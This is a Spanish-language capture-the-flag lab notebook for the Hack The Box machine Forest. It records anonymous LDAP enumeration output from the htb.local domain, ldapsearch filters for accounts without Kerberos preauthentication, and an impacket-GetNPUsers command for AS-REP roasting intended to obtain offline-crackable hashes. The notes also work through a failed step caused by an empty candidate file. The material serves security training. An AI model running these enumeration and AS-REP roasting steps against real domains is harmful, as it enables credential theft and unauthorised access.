dn: CN=ExchangeActiveSyncDevices,CN=HealthMailboxc3d7722415ad41a5b19e3e00e165e
dn: CN=HealthMailboxfc9daad117b84fe08b081886bd8a5a50,CN=Monitoring Mailboxes,C
sAMAccountName: HealthMailboxfc9daad
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: HealthMailboxfc9daad117b84fe08b081886bd8a5a50@htb.local
dn: CN=ExchangeActiveSyncDevices,CN=HealthMailboxfc9daad117b84fe08b081886bd8a5
dn: CN=HealthMailboxc0a90c97d4994429b15003d6a518f3f5,CN=Monitoring Mailboxes,C
sAMAccountName: HealthMailboxc0a90c9
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: HealthMailboxc0a90c97d4994429b15003d6a518f3f5@htb.local
dn: CN=HealthMailbox670628ec4dd64321acfdf6e67db3a2d8,CN=Monitoring Mailboxes,C
sAMAccountName: HealthMailbox670628e
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8@htb.local
dn: CN=HealthMailbox968e74dd3edb414cb4018376e7dd95ba,CN=Monitoring Mailboxes,C
sAMAccountName: HealthMailbox968e74d
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: HealthMailbox968e74dd3edb414cb4018376e7dd95ba@htb.local
dn: CN=HealthMailbox6ded67848a234577a1756e072081d01f,CN=Monitoring Mailboxes,C
sAMAccountName: HealthMailbox6ded678
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: HealthMailbox6ded67848a234577a1756e072081d01f@htb.local
dn: CN=HealthMailbox83d6781be36b4bbf8893b03c2ee379ab,CN=Monitoring Mailboxes,C
sAMAccountName: HealthMailbox83d6781
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab@htb.local
dn: CN=HealthMailboxfd87238e536e49e08738480d300e3772,CN=Monitoring Mailboxes,C
sAMAccountName: HealthMailboxfd87238
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: HealthMailboxfd87238e536e49e08738480d300e3772@htb.local
dn: CN=HealthMailboxb01ac647a64648d2a5fa21df27058a24,CN=Monitoring Mailboxes,C
sAMAccountName: HealthMailboxb01ac64
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: HealthMailboxb01ac647a64648d2a5fa21df27058a24@htb.local
dn: CN=HealthMailbox7108a4e350f84b32a7a90d8e718f78cf,CN=Monitoring Mailboxes,C
sAMAccountName: HealthMailbox7108a4e
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf@htb.local
dn: CN=HealthMailbox0659cc188f4c4f9f978f6c2142c4181e,CN=Monitoring Mailboxes,C
sAMAccountName: HealthMailbox0659cc1
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e@htb.local
dn: CN=Exchange Install Domain Servers,CN=Microsoft Exchange System Objects,DC
memberOf: CN=Exchange Servers,OU=Microsoft Exchange Security Groups,DC=htb,DC=
dn: CN=SystemMailbox{ce2583c9-4e38-48ab-b23d-88d6e3aa059f},CN=Microsoft Exchan
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
dn: CN=Managed Service Accounts,DC=htb,DC=local
dn: OU=Service Accounts,DC=htb,DC=local
dn: CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local
dn: CN=Service Accounts,OU=Security Groups,DC=htb,DC=local
dn: OU=Exchange Administrators,OU=Information Technology,OU=Employees,DC=htb,D
dn: CN=Sebastien Caron,OU=Exchange Administrators,OU=Information Technology,OU
dn: CN=Certificate Service DCOM Access,CN=Builtin,DC=htb,DC=local
sAMAccountName: Certificate Service DCOM Access
dn: OU=Microsoft Exchange Security Groups,DC=htb,DC=local
dn: CN=Organization Management,OU=Microsoft Exchange Security Groups,DC=htb,DC
dn: CN=Recipient Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=lo
dn: CN=View-Only Organization Management,OU=Microsoft Exchange Security Groups
dn: CN=Public Folder Management,OU=Microsoft Exchange Security Groups,DC=htb,D
dn: CN=UM Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
dn: CN=Help Desk,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
dn: CN=Records Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=loca
dn: CN=Discovery Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=lo
dn: CN=Server Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
dn: CN=Delegated Setup,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
dn: CN=Hygiene Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=loca
dn: CN=Compliance Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=l
dn: CN=Security Reader,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
dn: CN=Security Administrator,OU=Microsoft Exchange Security Groups,DC=htb,DC=
dn: CN=Exchange Servers,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
memberOf: CN=Managed Availability Servers,OU=Microsoft Exchange Security Group
sAMAccountName: Exchange Servers
dn: CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=htb
memberOf: CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Group
sAMAccountName: Exchange Trusted Subsystem
dn: CN=Managed Availability Servers,OU=Microsoft Exchange Security Groups,DC=h
dn: CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=h
sAMAccountName: Exchange Windows Permissions
dn: CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=htb,DC=l
sAMAccountName: ExchangeLegacyInterop

## Conclusiones

La enumeración LDAP anónima queda confirmada.

El controlador de dominio permite consultar objetos del dominio htb.local sin credenciales. Este hallazgo valida la rama principal AD / LDAP / Kerberos / SMB y permite avanzar hacia una enumeración más precisa de usuarios, cuentas de servicio y atributos Kerberos.

El hallazgo dominante de esta fase es la aparición de svc-alfresco dentro de la OU Service Accounts.

También se confirma la presencia de Microsoft Exchange en el dominio mediante múltiples objetos, buzones de sistema, grupos de seguridad de Exchange y el equipo EXCH01$.

La lista domain_users_raw.txt generada con awk '{print $2}' no debe tomarse como lista limpia de usuarios. El motivo es que también recoge grupos con espacios y corta sus nombres por la primera palabra. Por ejemplo, Remote Management Users queda reducido a Remote. Esta salida sirve como pista inicial, pero debe corregirse antes de usarla como base para Kerberos.

El siguiente paso único es generar una lista limpia de usuarios reales y comprobar si existe alguna cuenta con Kerberos preauthentication deshabilitada. Esta verificación permite decidir si la siguiente técnica aplicable es ASREPRoasting. La guía oficial de Forest describe precisamente esta línea: LDAP anonymous bind, enumeración de objetos, cuenta de servicio sin preautenticación Kerberos, crackeo offline y acceso inicial posterior.

Objetivo

Depurar la enumeración LDAP obtenida y convertirla en evidencia útil para la siguiente decisión técnica.

La finalidad inmediata es identificar cuentas de usuario reales, aislar la cuenta svc-alfresco y comprobar si algún objeto de usuario tiene el flag de Kerberos que permite solicitar un AS-REP sin conocer contraseña previa.

Hechos verificados

La resolución local de dominio funciona correctamente:

htb.local         -> 10.129.34.129
forest.htb.local  -> 10.129.34.129

LDAP anonymous bind funciona contra:

ldap://10.129.34.129:389
Base DN: dc=htb,dc=local

La consulta LDAP devuelve objetos del dominio sin aportar credenciales.

Se observa la existencia de Microsoft Exchange en el dominio mediante:

objetos SystemMailbox;
objetos HealthMailbox;
Exchange Online-ApplicationAccount;
EXCH01$;
grupos bajo OU=Microsoft Exchange Security Groups;
SPNs asociados a Exchange;
Exchange Trusted Subsystem;
Exchange Windows Permissions.

Se observa el equipo EXCH01$ con múltiples SPNs, entre ellos servicios IMAP, POP, SMTP, WSMAN y HOST.

Se observa el controlador de dominio FOREST$ con SPNs propios de DC, LDAP, DNS, GC, HOST y RPC.

Se observan usuarios humanos en distintas unidades organizativas:

sebastien
santi
lucinda
andy
mark

Se observa la cuenta de servicio:

CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local

Se observan grupos relevantes para fases posteriores:

Account Operators
Remote Management Users
Exchange Windows Permissions
Exchange Trusted Subsystem
Exchange Servers

La aparición de svc-alfresco todavía no confirma por sí sola ASREPRoasting. Solo confirma que existe una cuenta de servicio candidata.

Suposiciones

La cuenta svc-alfresco es la candidata principal para revisar Kerberos preauthentication.

La presencia de Exchange puede ser relevante para fases posteriores de privilegios de dominio, pero todavía no es la rama activa.

WinRM continúa como rama secundaria pendiente de credenciales válidas.

SMB continúa como rama secundaria de apoyo, pero en este momento LDAP está aportando más señal.

La lista domain_users_raw.txt debe regenerarse con un filtro LDAP más preciso antes de utilizarse con herramientas Kerberos.

Método

La fase debe continuar con una depuración de LDAP en tres pasos.

Primero se enumeran únicamente objetos de usuario reales, evitando mezclar grupos, equipos y contenedores.

Después se consulta el objeto completo de svc-alfresco para revisar atributos útiles: sAMAccountName, userPrincipalName, userAccountControl, memberOf, description, servicePrincipalName y otros campos que puedan orientar la siguiente decisión.

Finalmente se realiza una búsqueda LDAP específica del flag DONT_REQ_PREAUTH, que identifica cuentas que no requieren preautenticación Kerberos.

Si aparece una cuenta con ese flag, la siguiente verificación corta será solicitar su AS-REP y guardarlo como evidencia para crackeo offline.

Respuesta

La ruta sigue siendo correcta.

LDAP anonymous bind queda confirmado y la enumeración devuelve una estructura de dominio rica. No hay que saltar todavía a BloodHound ni a WinRM. Antes debe cerrarse la parte Kerberos con evidencia limpia.

La salida actual ya permite afirmar que Forest no es una máquina de “web + exploit”, sino un laboratorio de Active Directory centrado en enumeración LDAP, Kerberos y abuso posterior de permisos de dominio.

La cuenta svc-alfresco es ahora el pivote lógico, pero todavía falta verificar su propiedad Kerberos crítica.

El siguiente paso único es comprobar si svc-alfresco u otra cuenta de usuario tiene deshabilitada la preautenticación Kerberos.

Comandos
ldapsearch -x -H ldap://10.129.34.129:389 -b "dc=htb,dc=local" \
  '(&(objectCategory=person)(objectClass=user))' \
  sAMAccountName userPrincipalName userAccountControl memberOf description servicePrincipalName \
  | tee content/ldap/ldap_users_clean.ldif

Este comando repite la consulta LDAP, pero limitando el resultado a objetos que sean usuarios reales.

El filtro evita mezclar grupos, contenedores y objetos de sistema con cuentas de usuario. Esto corrige el problema observado en domain_users_raw.txt, donde aparecían entradas parciales como Remote, Exchange, Security o Domain.

La parte importante de la salida será:

sAMAccountName;
userPrincipalName;
userAccountControl;
memberOf;
servicePrincipalName;
description.
grep -i '^sAMAccountName:' content/ldap/ldap_users_clean.ldif \
  | awk '{print $2}' \
  | sort -u \
  | tee content/users/domain_users_clean.txt

Este comando genera una lista más limpia de usuarios reales.

Esta lista sí puede utilizarse como base para comprobaciones Kerberos posteriores, porque parte de una consulta filtrada por usuarios y no de todos los objetos del dominio.

ldapsearch -x -H ldap://10.129.34.129:389 -b "dc=htb,dc=local" \
  "(sAMAccountName=svc-alfresco)" \
  "*" \
  | tee content/ldap/svc_alfresco_full.ldif

Este comando consulta el objeto completo de svc-alfresco.

La finalidad es obtener evidencia directa de la cuenta candidata y no trabajar solo con una línea parcial del LDIF.

Interesan especialmente estos campos:

distinguishedName;
sAMAccountName;
userPrincipalName;
userAccountControl;
memberOf;
description;
servicePrincipalName;
lastLogonTimestamp;
pwdLastSet.
ldapsearch -x -H ldap://10.129.34.129:389 -b "dc=htb,dc=local" \
  '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
  sAMAccountName userPrincipalName userAccountControl memberOf \
  | tee content/ldap/asrep_candidates.ldif

Este comando busca usuarios con el flag DONT_REQ_PREAUTH.

La regla LDAP 1.2.840.113556.1.4.803 permite comprobar si un bit concreto está activo dentro de userAccountControl.

El valor 4194304 corresponde al flag que indica que la cuenta no requiere preautenticación Kerberos.

Si esta consulta devuelve svc-alfresco, la hipótesis de ASREPRoasting queda apoyada por evidencia local.

grep -i '^sAMAccountName:' content/ldap/asrep_candidates.ldif \
  | awk '{print $2}' \
  | sort -u \
  | tee content/users/asrep_candidates.txt

Este comando extrae una lista limpia de usuarios candidatos a ASREPRoasting.

La salida esperada, si la ruta coincide con la evidencia del laboratorio, debería contener svc-alfresco.

impacket-GetNPUsers htb.local/ \
  -dc-ip 10.129.34.129 \
  -usersfile content/users/asrep_candidates.txt \
  -no-pass \
  -outputfile loot/ad/asrep_hashes.txt

Este comando solicita AS-REP para los usuarios candidatos sin aportar contraseña.

No prueba una contraseña ni inicia sesión. La finalidad es validar si Kerberos entrega material cifrado para una cuenta sin preautenticación.

La parte importante de la salida será una línea que empiece por:

$krb5asrep$

Si aparece esa línea, se habrá obtenido un hash Kerberos crackeable offline.

Comprobaciones

Debe existir el archivo:

content/ldap/ldap_users_clean.ldif

Debe existir una lista limpia de usuarios en:

content/users/domain_users_clean.txt

Debe existir el objeto completo de svc-alfresco en:

content/ldap/svc_alfresco_full.ldif

Debe comprobarse si svc-alfresco aparece en:

content/users/asrep_candidates.txt

Debe comprobarse si loot/ad/asrep_hashes.txt contiene una línea $krb5asrep$.

No debe usarse domain_users_raw.txt como lista definitiva, porque contiene entradas contaminadas por nombres de grupos y objetos no usuarios.

Registro didáctico

La enumeración LDAP anónima transforma el caso de una simple detección de servicios AD en una enumeración real del dominio.

El punto clave no es solo que LDAP responda, sino que permite leer estructura interna: usuarios, OUs, equipos, buzones, grupos de Exchange y cuentas de servicio.

La aparición de svc-alfresco es importante porque una cuenta de servicio suele tener propiedades distintas a una cuenta humana: puede estar configurada para compatibilidad con servicios, integraciones o autenticación heredada.

En Active Directory, ASREPRoasting no depende de tener una contraseña previa. Depende de que una cuenta tenga deshabilitada la preautenticación Kerberos. Por eso el paso correcto no es lanzar herramientas a ciegas, sino comprobar el atributo userAccountControl.

La siguiente decisión depende de una única evidencia:

Si aparece un candidato con DONT_REQ_PREAUTH, la rama continúa hacia ASREPRoasting.
Si no aparece ningún candidato, la rama debe reevaluarse hacia SMB, SPNs, grupos o enumeración adicional del dominio.

El hallazgo dominante actual es svc-alfresco como cuenta de servicio candidata.

La rama principal activa sigue siendo AD / LDAP / Kerberos.

Las ramas secundarias siguen siendo WinRM y SMB.

El siguiente paso único es confirmar candidatos ASREPRoasting y, si existen, solicitar el AS-REP correspondiente.

## Debido a una reconexión de HTB y un cambio en la Ip de la  máquina Forest, hemos tenido que actualizar varias cosas:

❯ ldapsearch -x -H ldap://10.129.95.210:389 -b "dc=htb,dc=local" \
  '(&(objectCategory=person)(objectClass=user))' \
  sAMAccountName userPrincipalName userAccountControl memberOf description servicePrincipalName \
  | tee content/ldap/ldap_users_clean.ldif
# extended LDIF
#
# LDAPv3
# base <dc=htb,dc=local> with scope subtree
# filter: (&(objectCategory=person)(objectClass=user))
# requesting: sAMAccountName userPrincipalName userAccountControl memberOf description servicePrincipalName
#

# Guest, Users, htb.local
dn: CN=Guest,CN=Users,DC=htb,DC=local
description: Built-in account for guest access to the computer/domain
memberOf: CN=Guests,CN=Builtin,DC=htb,DC=local
userAccountControl: 66082
sAMAccountName: Guest

# DefaultAccount, Users, htb.local
dn: CN=DefaultAccount,CN=Users,DC=htb,DC=local
description: A user account managed by the system.
memberOf: CN=System Managed Accounts Group,CN=Builtin,DC=htb,DC=local
userAccountControl: 66082
sAMAccountName: DefaultAccount

# Exchange Online-ApplicationAccount, Users, htb.local
dn: CN=Exchange Online-ApplicationAccount,CN=Users,DC=htb,DC=local
userAccountControl: 546
sAMAccountName: $331000-VK4ADACQNUCA
userPrincipalName: Exchange_Online-ApplicationAccount@htb.local

# SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}, Users, htb.local
dn: CN=SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1},CN=Users,DC=htb,DC=
 local
userAccountControl: 514
sAMAccountName: SM_2c8eef0a09b545acb
userPrincipalName: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.loc
 al

# SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}, Users, htb.local
dn: CN=SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c},CN=Users,DC=htb,DC=
 local
userAccountControl: 514
sAMAccountName: SM_ca8c2ed5bdab4dc9b
userPrincipalName: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.loc
 al

# SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}, Users, htb.local
dn: CN=SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9},CN=Users,DC=htb,DC=
 local
userAccountControl: 514
sAMAccountName: SM_75a538d3025e4db9a
userPrincipalName: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.loc
 al

# DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}, Users, htb.loc
 al
dn: CN=DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852},CN=Users,
 DC=htb,DC=local
userAccountControl: 514
sAMAccountName: SM_681f53d4942840e18
userPrincipalName: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB85
 2}@htb.local

# Migration.8f3e7716-2011-43e4-96b1-aba62d229136, Users, htb.local
dn: CN=Migration.8f3e7716-2011-43e4-96b1-aba62d229136,CN=Users,DC=htb,DC=local
userAccountControl: 514
sAMAccountName: SM_1b41c9286325456bb
userPrincipalName: Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local

# FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042, Users, htb.local
dn: CN=FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042,CN=Users,DC=htb,DC=
 local
userAccountControl: 514
sAMAccountName: SM_9b69f1b9d2cc45549
userPrincipalName: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.loc
 al

# SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}, Users, htb.local
dn: CN=SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201},CN=Users,DC=htb,DC=
 local
userAccountControl: 514
sAMAccountName: SM_7c96b981967141ebb
userPrincipalName: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.loc
 al

# SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}, Users, htb.local
dn: CN=SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA},CN=Users,DC=htb,DC=
 local
userAccountControl: 514
sAMAccountName: SM_c75ee099d0a64c91b
userPrincipalName: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}@htb.loc
 al

# SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}, Users, htb.local
dn: CN=SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9},CN=Users,DC=htb,DC=
 local
userAccountControl: 514
sAMAccountName: SM_1ffab36a2f5f479cb
userPrincipalName: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}@htb.loc
 al

# HealthMailboxc3d7722415ad41a5b19e3e00e165edbe, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailboxc3d7722415ad41a5b19e3e00e165edbe,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
userAccountControl: 66048
sAMAccountName: HealthMailboxc3d7722
userPrincipalName: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe@htb.local

# HealthMailboxfc9daad117b84fe08b081886bd8a5a50, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailboxfc9daad117b84fe08b081886bd8a5a50,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
userAccountControl: 66048
sAMAccountName: HealthMailboxfc9daad
userPrincipalName: HealthMailboxfc9daad117b84fe08b081886bd8a5a50@htb.local

# HealthMailboxc0a90c97d4994429b15003d6a518f3f5, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailboxc0a90c97d4994429b15003d6a518f3f5,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
userAccountControl: 66048
sAMAccountName: HealthMailboxc0a90c9
userPrincipalName: HealthMailboxc0a90c97d4994429b15003d6a518f3f5@htb.local

# HealthMailbox670628ec4dd64321acfdf6e67db3a2d8, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailbox670628ec4dd64321acfdf6e67db3a2d8,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
userAccountControl: 66048
sAMAccountName: HealthMailbox670628e
userPrincipalName: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8@htb.local

# HealthMailbox968e74dd3edb414cb4018376e7dd95ba, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailbox968e74dd3edb414cb4018376e7dd95ba,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
userAccountControl: 66048
sAMAccountName: HealthMailbox968e74d
userPrincipalName: HealthMailbox968e74dd3edb414cb4018376e7dd95ba@htb.local

# HealthMailbox6ded67848a234577a1756e072081d01f, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailbox6ded67848a234577a1756e072081d01f,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
userAccountControl: 66048
sAMAccountName: HealthMailbox6ded678
userPrincipalName: HealthMailbox6ded67848a234577a1756e072081d01f@htb.local

# HealthMailbox83d6781be36b4bbf8893b03c2ee379ab, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailbox83d6781be36b4bbf8893b03c2ee379ab,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
userAccountControl: 66048
sAMAccountName: HealthMailbox83d6781
userPrincipalName: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab@htb.local

# HealthMailboxfd87238e536e49e08738480d300e3772, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailboxfd87238e536e49e08738480d300e3772,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
userAccountControl: 66048
sAMAccountName: HealthMailboxfd87238
userPrincipalName: HealthMailboxfd87238e536e49e08738480d300e3772@htb.local

# HealthMailboxb01ac647a64648d2a5fa21df27058a24, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailboxb01ac647a64648d2a5fa21df27058a24,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
userAccountControl: 66048
sAMAccountName: HealthMailboxb01ac64
userPrincipalName: HealthMailboxb01ac647a64648d2a5fa21df27058a24@htb.local

# HealthMailbox7108a4e350f84b32a7a90d8e718f78cf, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailbox7108a4e350f84b32a7a90d8e718f78cf,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
userAccountControl: 66048
sAMAccountName: HealthMailbox7108a4e
userPrincipalName: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf@htb.local

# HealthMailbox0659cc188f4c4f9f978f6c2142c4181e, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailbox0659cc188f4c4f9f978f6c2142c4181e,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
userAccountControl: 66048
sAMAccountName: HealthMailbox0659cc1
userPrincipalName: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e@htb.local

# Sebastien Caron, Exchange Administrators, Information Technology, Employees,
 htb.local
dn: CN=Sebastien Caron,OU=Exchange Administrators,OU=Information Technology,OU
 =Employees,DC=htb,DC=local
userAccountControl: 66048
sAMAccountName: sebastien
userPrincipalName: sebastien@htb.local

# Lucinda Berger, IT Management, Information Technology, Employees, htb.local
dn: CN=Lucinda Berger,OU=IT Management,OU=Information Technology,OU=Employees,
 DC=htb,DC=local
userAccountControl: 66048
sAMAccountName: lucinda
userPrincipalName: lucinda@htb.local

# Andy Hislip, Helpdesk, Information Technology, Employees, htb.local
dn: CN=Andy Hislip,OU=Helpdesk,OU=Information Technology,OU=Employees,DC=htb,D
 C=local
userAccountControl: 66048
sAMAccountName: andy
userPrincipalName: andy@htb.local

# Mark Brandt, Sysadmins, Information Technology, Employees, htb.local
dn: CN=Mark Brandt,OU=Sysadmins,OU=Information Technology,OU=Employees,DC=htb,
 DC=local
userAccountControl: 66048
sAMAccountName: mark
userPrincipalName: mark@htb.local

# Santi Rodriguez, Developers, Information Technology, Employees, htb.local
dn: CN=Santi Rodriguez,OU=Developers,OU=Information Technology,OU=Employees,DC
 =htb,DC=local
userAccountControl: 66048
sAMAccountName: santi
userPrincipalName: santi@htb.local

# search reference
ref: ldap://ForestDnsZones.htb.local/DC=ForestDnsZones,DC=htb,DC=local

# search reference
ref: ldap://DomainDnsZones.htb.local/DC=DomainDnsZones,DC=htb,DC=local

# search reference
ref: ldap://htb.local/CN=Configuration,DC=htb,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 32
# numEntries: 28
# numReferences: 3
❯ grep -i '^sAMAccountName:' content/ldap/ldap_users_clean.ldif \
  | awk '{print $2}' \
  | sort -u \
  | tee content/users/domain_users_clean.txt
$331000-VK4ADACQNUCA
andy
DefaultAccount
Guest
HealthMailbox0659cc1
HealthMailbox670628e
HealthMailbox6ded678
HealthMailbox7108a4e
HealthMailbox83d6781
HealthMailbox968e74d
HealthMailboxb01ac64
HealthMailboxc0a90c9
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxfd87238
lucinda
mark
santi
sebastien
SM_1b41c9286325456bb
SM_1ffab36a2f5f479cb
SM_2c8eef0a09b545acb
SM_681f53d4942840e18
SM_75a538d3025e4db9a
SM_7c96b981967141ebb
SM_9b69f1b9d2cc45549
SM_c75ee099d0a64c91b
SM_ca8c2ed5bdab4dc9b
❯ ldapsearch -x -H ldap://10.129.95.210:389 -b "dc=htb,dc=local" \
  "(sAMAccountName=svc-alfresco)" \
  "*" \
  | tee content/ldap/svc_alfresco_full.ldif
# extended LDIF
#
# LDAPv3
# base <dc=htb,dc=local> with scope subtree
# filter: (sAMAccountName=svc-alfresco)
# requesting: *
#

# search reference
ref: ldap://ForestDnsZones.htb.local/DC=ForestDnsZones,DC=htb,DC=local

# search reference
ref: ldap://DomainDnsZones.htb.local/DC=DomainDnsZones,DC=htb,DC=local

# search reference
ref: ldap://htb.local/CN=Configuration,DC=htb,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 4
# numReferences: 3
❯ grep -i '^sAMAccountName:' content/ldap/asrep_candidates.ldif \
  | awk '{print $2}' \
  | sort -u \
  | tee content/users/asrep_candidates.txt
grep: content/ldap/asrep_candidates.ldif: No existe el fichero o el directorio
❯ cat content/users/asrep_candidates.txt
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: content/users/asrep_candidates.txt   <EMPTY>
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ impacket-GetNPUsers htb.local/ \
  -dc-ip 10.129.95.210 \
  -usersfile content/users/asrep_candidates.txt \
  -no-pass \
  -outputfile loot/ad/asrep_hashes.txt
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

❯ cat content/users/asrep_candidates.txt
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: content/users/asrep_candidates.txt   <EMPTY>
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

## Conclusiones

La enumeración LDAP anónima sigue confirmada y devuelve usuarios reales del dominio, buzones de Exchange y cuentas internas.

La cuenta svc-alfresco aparece en la enumeración general anterior como:

CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local

Sin embargo, la consulta específica por sAMAccountName=svc-alfresco no devuelve entrada. Esto significa que, con la información actual, svc-alfresco está confirmado como CN observado, pero no como sAMAccountName recuperado por esa consulta LDAP concreta.

El error principal de la secuencia es que no se ejecutó la consulta LDAP que debía crear:

content/ldap/asrep_candidates.ldif

Después se intentó hacer grep sobre ese archivo inexistente. Eso creó un archivo vacío:

content/users/asrep_candidates.txt

Por ese motivo GetNPUsers no devolvió nada: recibió una lista vacía de usuarios.

El siguiente paso único es validar svc-alfresco directamente por Kerberos, ya que existe como objeto LDAP observado y el writeup oficial lo trata como cuenta candidata.

Objetivo

Corregir la fase ASREPRoasting y obtener una evidencia clara de si svc-alfresco permite solicitar un AS-REP sin contraseña previa.

La finalidad inmediata es comprobar si Kerberos entrega un hash $krb5asrep$ para esa cuenta.

Hechos verificados

El directorio de trabajo es correcto:

/home/r4mon/pentest/targets/HTB/easy/FOREST

La nueva IP objetivo usada es:

10.129.95.210

LDAP responde correctamente en la nueva IP.

La consulta filtrada de usuarios devuelve 28 entradas.

Se observan usuarios humanos del dominio:

sebastien
lucinda
andy
mark
santi

Se observan múltiples cuentas internas de Exchange:

SM_*
HealthMailbox*
Exchange Online-ApplicationAccount

Se confirma presencia de Microsoft Exchange en el dominio.

La consulta específica:

(sAMAccountName=svc-alfresco)

no devuelve entrada.

El archivo content/users/asrep_candidates.txt existe, pero está vacío.

